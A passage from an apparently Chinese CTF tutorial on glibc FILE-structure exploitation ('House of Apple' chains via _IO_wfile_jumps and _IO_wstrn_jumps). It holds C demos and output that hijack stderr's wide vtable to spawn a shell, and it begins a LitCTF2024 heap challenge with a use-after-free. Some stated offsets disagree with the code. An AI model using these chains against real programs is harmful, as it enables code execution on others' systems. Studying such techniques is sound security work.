<code>fp-&gt;_IO_write_base</code><br><code>fp-&gt;_wide_data</code>写入可控地址<br><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate</code>（位于<code>fp-&gt;_wide_data-&gt;_wide_vtable+0x68</code>）设置为后门函数<br><code>fp-&gt;_wide_data-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> &#x3D;&#x3D; <strong>0</strong><br><br>至于这些条件为什么这么设置，看<code>glibc</code>源码便知<br>我们看最终效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo3</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x7835d481b6a0</span><br><span class="line">[*] _IO_wfile_jumps address: 0x7835d48170c0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0xfffff7f5 + ;sh</span><br><span class="line">[+] step 2: set stderr-&gt;_IO_write_base &lt;  stderr-&gt;_IO_write_ptr</span><br><span class="line">[+] step 3: change stderr-&gt;_mode to -1</span><br><span class="line">[+] step 4: change stderr-&gt;vtable to _IO_wfile_jumps</span><br><span class="line">[+] step 5: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 7: set stderr-&gt;_wide_data-&gt;_IO_write_base = 0  stderr-&gt;_wide_data-&gt;_IO_buf_base = 0</span><br><span class="line">[+] step 8: put backdoor at fake _wide_vtable-&gt;doallocate</span><br><span class="line">[+] step 9: call exit to trigger backdoor func</span><br><span class="line">sh: 1: ����: not found</span><br><span class="line">$ whoami</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>成功getshell</p><h4 id="IO-wdefault-xsgetn"><a href="#IO-wdefault-xsgetn" class="headerlink" title="_IO_wdefault_xsgetn"></a>_IO_wdefault_xsgetn</h4><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span><br></pre></td></tr></table></figure><p>demo如下（glibc2.35）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = puts_addr + <span class="number">0x19a850</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x19a850</span>+<span class="number">0xd8</span><span class="number">-0x4998</span><span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line">  </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr - <span class="number">0x20</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下条件<br><code>fp-&gt;_flags</code>设置为<code>0x800</code>，如果需要getshell则设置为<code>0xfbad0802</code>或者<code>0xffff0802</code>，然后后续加上<code>;sh\x00</code>即可<br><code>fp-&gt;vtable</code>设置为<code>_IO_wstrn_jumps</code> (<code>/_IO_wmem_jumps/_IO_wstr_jumps</code>)，这里测试发现<code>_IO_wstrn_jumps - 0x20</code>可行 <br><code>fp-&gt;_wide_data-&gt;_IO_write_ptr</code> <strong>&gt;</strong> <code>fp-&gt;_wide_data-&gt;_IO_write_base</code><br><code>fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr</code> &#x3D;&#x3D; <strong>0</strong><br><code>fp-&gt;_wide_data</code>写入可控地址<br><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;overflow</code>（位于<code>fp-&gt;_wide_data-&gt;_wide_vtable+0x68</code>）设置为后门函数<br><code>fp-&gt;_wide_data-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> &#x3D;&#x3D; <strong>0</strong><br><br>效果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo2</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x702910a1b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x702910a16dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0x800</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><p>然后这里我们在step2加上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;stderr2[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;;sh\x00&quot;</span>);</span><br></pre></td></tr></table></figure><p>step7改成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;system);</span><br></pre></td></tr></table></figure><p>这时候gdb执行到最后发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/apple/demo2</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x7ffff7e1b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x7ffff7e16dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0x800</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">[Attaching after Thread 0x7ffff7fb1740 (LWP 25536) vfork to child process 25539]</span><br><span class="line">[New inferior 2 (process 25539)]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[Detaching vfork parent process 25536 after child exec]</span><br><span class="line">[Inferior 1 (process 25536) detached]</span><br><span class="line">process 25539 is executing new program: /usr/bin/dash</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[Inferior 2 (process 25539) exited normally]</span><br></pre></td></tr></table></figure><p>发现这里确实启动了<code>/usr/bin/dash</code>但是直接退出了，这里怀疑是<code>system</code>的参数问题，然后意识到覆盖的<code>_wide_vtable-&gt;_overflow</code>的参数是<code>stderr</code>，我们这里仅仅在其<code>_flags</code>域（为0x800）后加上<code>;sh\x00</code>，会被<code>0x800</code>的<code>\x00</code>截断导致<code>system</code>的参数异常<br>如何解决呢？把截断想办法去掉就好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">size_t</span> *)stderr2 = <span class="number">0xfbad0802</span>; <span class="comment">//0xffff0802</span></span><br></pre></td></tr></table></figure><p>这样修改后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo2</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x73fe9f41b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x73fe9f416dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0xfbad0802</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">sh: 1:��: not found</span><br><span class="line">$ whoami</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>成功getshell</p><h4 id="IO-wfile-underflow-mmap"><a href="#IO-wfile-underflow-mmap" class="headerlink" title="_IO_wfile_underflow_mmap"></a>_IO_wfile_underflow_mmap</h4><p>#todo</p><h2 id="0x02-例题-LitCTF2024-heap-2-39"><a href="#0x02-例题-LitCTF2024-heap-2-39" class="headerlink" title="0x02 例题 LitCTF2024 heap-2.39"></a>0x02 例题 LitCTF2024 heap-2.39</h2><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Exit();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建堆函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> || ptr[v2] || (<span class="built_in">printf</span>(<span class="string">&quot;size? &quot;</span>), __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3), v3 &lt;= <span class="number">1039</span>) || v3 &gt; <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v2;</span><br><span class="line">    ptr[v1] = <span class="built_in">malloc</span>(v3);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">    ptr_size[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限定了size在largebin范围。记录了size大小<br>free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)ptr[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未清指针，可以uaf<br>打印函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)ptr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输出，注意printf的截断<br>edit函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content : &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)ptr[v1], (<span class="type">unsigned</span> <span class="type">int</span>)ptr_size[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据建堆时记录的size限制输入大小，无法溢出，但是可以利用presize的复用<br>退出函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title 